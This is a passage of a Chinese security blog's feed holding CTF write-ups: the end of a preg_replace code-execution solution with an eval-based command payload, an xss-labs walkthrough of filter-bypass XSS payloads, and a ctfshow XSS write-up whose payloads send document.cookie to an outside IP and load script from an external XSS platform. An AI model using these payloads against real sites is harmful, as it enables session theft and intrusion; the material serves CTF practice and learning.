class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里就牵扯到，我们下面所的文章。payload为\S*=${eval($_POST[cmd])}。cmd=cmd=system%28%27cat+%2Ffla*%27%29%3B</p><p><a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/yesec/p/12535534.html">[BUUOJ记录] [BJDCTF2020]Easy MD5 _</a></p><p><a href="https://lyiang.wordpress.com/2015/05/31/sql%E6%B3%A8%E5%85%A5%EF%BC%9A%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E6%B3%A8%E5%85%A5/">SQL注入：绕过空格注入</a></p><p><a href="https://www.cnblogs.com/shenjuxian/p/13916464.html">[BJDCTF2020]ZJCTF，不过如此</a></p><p><a href="https://xz.aliyun.com/t/2557">深入研究preg_replace与代码执行</a></p><p><a href="https://althims.com/2019/07/25/buu-online-tool-wp/">BUUCTF online tool writeup</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MD5 </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xsslabs</title>
      <link href="/2021/10/12/xsslabs/"/>
      <url>/2021/10/12/xsslabs/</url>
      
        <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>跨站脚本攻击 Cross-site scripting</p><h2 id="其他常用的JS语句"><a href="#其他常用的JS语句" class="headerlink" title="其他常用的JS语句"></a>其他常用的JS语句</h2><h3 id="JS事件"><a href="#JS事件" class="headerlink" title="JS事件"></a>JS事件</h3><pre class="line-numbers language-JS" data-language="JS"><code class="language-JS">&lt;img src&#x3D;&quot;1&quot; onerror&#x3D;&quot;alert(1)&quot; &gt; &#x2F;&#x2F; onerror 事件会在文档或图像加载过程中发生错误时被触发。 很明显，我们的图片链接肯定不正确，所以会触发onerror中的JS代码&lt;input type&#x3D;&quot;text&quot; onfocus&#x3D;&quot;alert(1)&quot;&gt;    &#x2F;&#x2F; 当目标焦点为这个歌文本框时，弹出xss代码，同样的我们可以使用其他事件。&lt;span onmouseover&#x3D;&quot;alert(1)&quot;&gt;violet&lt;&#x2F;span&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="JS中伪协议。基本是在标签中链接中被使用。"><a href="#JS中伪协议。基本是在标签中链接中被使用。" class="headerlink" title="JS中伪协议。基本是在标签中链接中被使用。"></a>JS中伪协议。基本是在标签中链接中被使用。</h3><pre class="line-numbers language-JS" data-language="JS"><code class="language-JS">&lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;violet&lt;&#x2F;a&gt;&lt;iframe src&#x3D;&quot;javascript:alert(1)&quot;&gt;&lt;&#x2F;iframe&gt;location.href &#x3D; &#39;javascript:alert(1)&#39;   &#x2F;&#x2F; 这个在本练习中不太好使。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="base64编码的-data-伪协议。"><a href="#base64编码的-data-伪协议。" class="headerlink" title="base64编码的  data: 伪协议。"></a>base64编码的  data: 伪协议。</h3><p>好家伙，没想到JS中也可以使用这个。当然形式不太一样。</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span> ，它的base64编码为PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K<span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"</span><span class="token operator">></span>test<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>很可惜在这里的环境没有办法使用。我自己写了代码也不行，不知道为啥。</p><h3 id="使用-eval、new-Function、setTimeout-执行字符串时"><a href="#使用-eval、new-Function、setTimeout-执行字符串时" class="headerlink" title="使用 eval、new Function、setTimeout 执行字符串时"></a>使用 eval、new Function、setTimeout 执行字符串时</h3><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token string">'alert(1)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'alert(2)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">var</span> f <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Function</span><span class="token punctuation">(</span><span class="token string">'alert(3)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="编码与解码"><a href="#编码与解码" class="headerlink" title="编码与解码"></a>编码与解码</h2><p>在xss中为了安全，通常会对特殊字符进行编码使其成为普通的字符，不具有语言功能。譬如，将&lt;编码为‘&amp;lt’;。htmlspecialchars也有相同的作用。</p><p>为什么要进行HTML实体的编码呢？</p><p>这涉及到浏览器的解析过程。</p><p>浏览器在解析HTML文档期间，根据文档中的内容，会经过 HTML解析、JS解析和URL解析几个过程</p><p>首先浏览器接收到一个HTML文档时，会触发HTML解析器对HTML文档进行词法解析，这完成HTML解码工作并创建DOM树。</p><p>如果HTML文档中存在JS的上下文环境，JavaScript解析器会介入对内联脚本进行解析，完成JS的解码工作。</p><p>如果浏览器遇到需要URL的上下文环境，URL解析器也会介入完成URL的解码工作。</p><p>URL解析器的解码顺序会根据URL所在位置不同，可能在JavaScript解析器之前或之后解析</p><h3 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h3><p>浏览器会对一些字符进行特殊识别处理，比如将 &lt; &gt; 识别为标签的开始结束。</p><p>要想在HTML页面中呈现出特殊字符，就需要用到对应的字符实体。比如在HTML解析过程中，如果要求输出值为 &lt; &gt; ，那么输入值应该为其对应的实体 &lt; &gt;</p><p>字符实体以&amp;开头 + 预先定义的实体名称，以分号结束，如“&lt;”的实体名称为&lt; </p><p>或以&amp;开头 + #符号 以及字符的十进制数字，如”&lt;”的实体编号为&#60;</p><p>或以&amp;开头 + #x符号 以及字符的十六进制数字，如”&lt;”的实体编号为&#x3c;</p><p>字符都是有实体编号的但有些字符没有实体名称。</p><p>如果想要知道实体编号可以用htmlspecialchars尝试一下。</p><p><a href="https://zh.rakko.tools/tools/21/">字符与编码实体的转换</a></p><h3 id="Javascript编码"><a href="#Javascript编码" class="headerlink" title="Javascript编码"></a>Javascript编码</h3><p>Unicode 是字符集，而 utf-8,utf-16,utf-32 是编码规则</p><p>最常用的如“\uXXXX”这种写法为Unicode转义序列，表示一个字符，其中xxxx表示一个16进制数字</p><p>如”&lt;” Unicode编码为“\u003c”，不区分大小写</p><p><a href="https://tool.chinaz.com/tools/unicode.aspx">unicode与普通编码相互转化</a></p><p>这个到时候会转换成16进制。</p><h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><p>%加字符的ASCII编码对于的2位16进制数字，如”/”对应的URL编码为%2f</p><p>转换可以使用 JS 自带的 encodeURIComponent 和 decodeURLComponent 方法来对特殊字符进行转义，也可以对照ASCII表为每个字符进行转换</p><h3 id="编码解码分析"><a href="#编码解码分析" class="headerlink" title="编码解码分析"></a>编码解码分析</h3><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>//www.baidu.com?a=1&amp;b=2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>abc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>等价于<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>//www.baidu.com?a=1%26b=2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>abc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>等价于<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>//www.baidu.com?a=1<span class="token entity" title="&#37;">&amp;#37;</span><span class="token entity" title="&#50;">&amp;#50;</span><span class="token entity" title="&#54;">&amp;#54;</span>b=2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>abc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面等同。可以看出需要在引号中才可使用。</p><p>编码顺序：URL编码 -&gt; HTML编码</p><p>解码顺序：HTML解码 -&gt; URL解码</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>abc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>等价于<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">\u0061\u006c\u0065\u0072\<span class="token function">u0074</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>abc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>等价于<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token operator">&amp;</span>#<span class="token number">92</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">117</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">48</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">48</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">54</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">49</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">92</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">117</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">48</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">48</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">54</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">99</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">92</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">117</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">48</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">48</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">54</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">53</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">92</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">117</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">48</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">48</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">55</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">50</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">92</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">117</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">48</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">48</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">55</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">52</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">40</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">49</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">41</span><span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>abc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编码顺序：Javascript编码 -&gt; HTML编码</p><p>解码顺序：HTML解码 -&gt; Javascript解码</p><p>需要注意的是，在JS的解码中，相关的<strong>标识符</strong>才能被正确解析（如这里的 alert 标识符），</p><p>像圆括号、双引号、单引号等等这些控制字符，在进行JavaScript解析的时候仅会被解码为对应的字符串文本（比如这里并未对 (1) 进行编码，如果对括号及括号里面内容做JS编码，将无法执行alert函数 ）</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"javascript:alert(1&lt;2)"</span><span class="token operator">></span>abc<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span>等价于<span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"javascript:\u0061\u006c\u0065\u0072\u0074(1&lt;2)"</span><span class="token operator">></span>abc<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span>等价于（使用<span class="token constant">JS</span>的方法进行的<span class="token constant">URL</span>编码）<span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"javascript:alert(1%3C2)"</span><span class="token operator">></span>abc<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span>等价于（使用转换成对应<span class="token constant">ASCII</span>编码对应<span class="token number">2</span>位<span class="token number">16</span>进制数字的<span class="token constant">URL</span>编码）<span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34%28%31%3C%32%29"</span><span class="token operator">></span>abc<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span>等价于<span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"javascript:alert(1%3C2)"</span><span class="token operator">></span>abc<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编码顺序：Javascript编码 -&gt; URL编码 -&gt; HTML编码</p><p>解码顺序：HTML解码 -&gt; URL解码 -&gt; Javascript解码</p><p>这里还需要注意的是，在URL的编码中，不能对协议类型（这里的 javascript: ）进行编码，否则URL解析器会认为它无类型，导致无法正确识别</p><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><pre class="line-numbers language-none"><code class="language-none">?name&#x3D;&lt;script&gt;alert(0)&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里没进行任何的过滤，我们输入一段JS代码即可。</p><p>我们通过解析源码可以发现，这里的php代码，会将我们传入的语句原封不动的添加到我们的浏览器页面中。也就是说，这里出现很明显的XSS漏洞。</p><p>同时，我们应当了解到，PHP的echo语句很特殊，浏览器会对php的echo语句进行等同我们自己所写前端代码一样的处理。比如，这里我们使用了echo 输出我们写入的JS，他不是将它作为字符串显示到页面就完事了。而是，将其真正作为一句JS代码进行了处理。</p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><img src="level2-1.png"></p><p>进入后，我们通过观察页面可以发现，url中参数keyword与输入框中内容相对应，那么不难猜想，我们可以通过输入参数来改变文本框中内容。那么我们再来尝试一下上一个问题中的JS代码。</p><p>很可惜，结果是并不可以。很奇怪，我们的JS代码竟然没有起作用，而是单纯的作为html代码显示了。</p><p><img src="level2-2.png"></p><p>那么，我们看一下现在的网页代码是怎样的。</p><p><img src="level2-3.png"></p><p>我们可以发现，我们JS被编码了，导致我们的代码没有办法正常的去执行。那么，我们看一下源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h2 align=center>没有找到和"</span><span class="token operator">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"相关的结果.&lt;/h2>"</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;center>&lt;form action=level2.php method=GET>&lt;input name=keyword  value="'</span><span class="token operator">.</span><span class="token variable">$str</span><span class="token operator">.</span>'"<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里出现了一个特殊的函数，这个函数的作用是什么呢？</p><blockquote><p>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。</p></blockquote><blockquote><p>预定义的字符是：</p></blockquote><blockquote><p>&amp; （和号）成为 &amp;<br>“ （双引号）成为 “<br>‘ （单引号）成为 ‘<br>&lt; （小于）成为 &lt;</p><blockquote><p>（大于）成为 &gt;</p></blockquote></blockquote><p>似乎无解了，但是我们可以发现不只是一个地方出现我们写入的JS代码，还有一个地方也出现了。那就是，我们的文本框中。从页面代码，和源码中我们可以发现，似乎我们在文本框中的内容没有被编码，而仅仅是被设置在””中。这样子，我们就可以绕过这里的过滤。</p><p>那么，我们稍微闭合一下value标签即可。</p><pre class="line-numbers language-none"><code class="language-none">&quot;&gt;&lt;span%20onmouseover&#x3D;&quot;alert(1)&quot;&gt;violet&lt;&#x2F;span&gt;“<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="level3-4"><a href="#level3-4" class="headerlink" title="level3,4"></a>level3,4</h2><p>我们尝试一下上面的语句，但是很可惜的发现，我们的方法不好用了。因为，文本框中的内容也被过滤。那么，我们该怎么办呢？很简单，构造一下事件。这是由input的特殊性决定的。</p><pre class="line-numbers language-none"><code class="language-none">&#39; onclick&#x3D;&#39;alert(violet)&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>我们输入上一题的payload，发现我们结果无法正确显示了。</p><p><img src="level5.png"></p><p>可以猜测on被过滤了。同样的，我们尝试script标签，也被过滤了。</p><p>我们不妨使用一下javascript伪协议试一试，毕竟谁知道它的过滤是不是严谨。</p><pre class="line-numbers language-none"><code class="language-none">&quot;&gt;&lt;a%20href&#x3D;&quot;javascript:alert(1)&quot;&gt;violet&lt;&#x2F;a&gt;&lt;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>看了一下源码，它的script的过滤为 “ &lt;script过滤为&lt;s_cript”</p><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>各种尝试了一下，发现它把该过滤的都过滤了，但是转念一想如果我将属性大写了呢？于是，一尝试果然可以。</p><pre class="line-numbers language-none"><code class="language-none">&quot;&gt;&lt;a+hRef%3D&quot;javascript%3Aalert%281%29&quot;&gt;violet&lt;%2Fa&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>至于上一个题，它在转换前，将我们传入的值都变为了小写。所以不可以。</p><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>我们发现on，script被替换为空，所以我们可以尝试双写绕过。</p><pre class="line-numbers language-none"><code class="language-none">oonnmouseover%3D&quot;alert%28%29&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>这里使用html编码</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token entity" title="&#106;">&amp;#106;</span><span class="token entity" title="&#97;">&amp;#97;</span><span class="token entity" title="&#118;">&amp;#118;</span><span class="token entity" title="&#97;">&amp;#97;</span><span class="token entity" title="&#115;">&amp;#115;</span><span class="token entity" title="&#99;">&amp;#99;</span><span class="token entity" title="&#114;">&amp;#114;</span><span class="token entity" title="&#105;">&amp;#105;</span><span class="token entity" title="&#112;">&amp;#112;</span><span class="token entity" title="&#116;">&amp;#116;</span><span class="token entity" title="&#58;">&amp;#58;</span><span class="token entity" title="&#97;">&amp;#97;</span><span class="token entity" title="&#108;">&amp;#108;</span><span class="token entity" title="&#101;">&amp;#101;</span><span class="token entity" title="&#114;">&amp;#114;</span><span class="token entity" title="&#116;">&amp;#116;</span><span class="token entity" title="&#40;">&amp;#40;</span><span class="token entity" title="&#48;">&amp;#48;</span><span class="token entity" title="&#41;">&amp;#41;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><p>这个题目，如果连接没有正常的url链接，将被替换为这个链接不正确。所以我们可以在我们上面的payload之后添加//<a href="http://www.baidu.com/">http://www.baidu.com</a></p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token entity" title="&#106;">&amp;#106;</span><span class="token entity" title="&#97;">&amp;#97;</span><span class="token entity" title="&#118;">&amp;#118;</span><span class="token entity" title="&#97;">&amp;#97;</span><span class="token entity" title="&#115;">&amp;#115;</span><span class="token entity" title="&#99;">&amp;#99;</span><span class="token entity" title="&#114;">&amp;#114;</span><span class="token entity" title="&#105;">&amp;#105;</span><span class="token entity" title="&#112;">&amp;#112;</span><span class="token entity" title="&#116;">&amp;#116;</span><span class="token entity" title="&#58;">&amp;#58;</span><span class="token entity" title="&#97;">&amp;#97;</span><span class="token entity" title="&#108;">&amp;#108;</span><span class="token entity" title="&#101;">&amp;#101;</span><span class="token entity" title="&#114;">&amp;#114;</span><span class="token entity" title="&#116;">&amp;#116;</span><span class="token entity" title="&#40;">&amp;#40;</span><span class="token entity" title="&#48;">&amp;#48;</span><span class="token entity" title="&#41;">&amp;#41;</span>//http://www.baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/imwtr/p/9721563.html">前端XSS相关整理</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshowXss</title>
      <link href="/2021/10/11/ctfshowxss/"/>
      <url>/2021/10/11/ctfshowxss/</url>
      
        <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>查看<a href="https://ctf-wiki.org/web/xss/">https://ctf-wiki.org/web/xss/</a>即可。</p><h2 id="Web316"><a href="#Web316" class="headerlink" title="Web316"></a>Web316</h2><p>将xss平台生成的Js代码输入即可</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span><span class="token operator">/</span>tExtArEa<span class="token operator">></span>'"<span class="token operator">></span><span class="token operator">&lt;</span>sCRiPt sRC<span class="token operator">=</span><span class="token comment">//xsshs.cn/XIsv>&lt;/sCrIpT></span><span class="token operator">&lt;</span>script<span class="token operator">></span>document<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web317-319"><a href="#Web317-319" class="headerlink" title="Web317-319"></a>Web317-319</h2><p>317过滤了script<br>318过滤了img</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span><span class="token constant">BODY</span> <span class="token constant">ONLOAD</span><span class="token operator">=</span>document<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">'http://82.157.126.166/gc.php?cookie='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token constant">BODY</span> <span class="token constant">ONLOAD</span><span class="token operator">=</span><span class="token operator">&amp;</span>#<span class="token number">100</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">111</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">99</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">117</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">109</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">101</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">110</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">116</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">46</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">108</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">111</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">99</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">97</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">116</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">105</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">111</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">110</span><span class="token punctuation">;</span><span class="token operator">=</span><span class="token string">'http://82.157.126.166/gc.php?cookie='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Web320-326"><a href="#Web320-326" class="headerlink" title="Web320-326"></a>Web320-326</h2><p>过滤了空格，使用/进行绕过。</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token operator">&lt;</span><span class="token constant">BODY</span><span class="token operator">/</span><span class="token constant">ONLOAD</span><span class="token operator">=</span>document<span class="token punctuation">.</span>location<span class="token operator">=</span><span class="token string">'http://82.157.126.166/gc.php?cookie='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span><span class="token operator">></span>请输入<span class="token operator">&lt;</span><span class="token operator">/</span>tExtArEa<span class="token operator">></span>'"<span class="token operator">></span><span class="token operator">&lt;</span>sCRiPt sRC<span class="token operator">=</span><span class="token comment">//xsshs.cn/XIsv>&lt;/sCrIpT></span><span class="token operator">&lt;</span>body<span class="token operator">/</span>onload<span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>document<span class="token 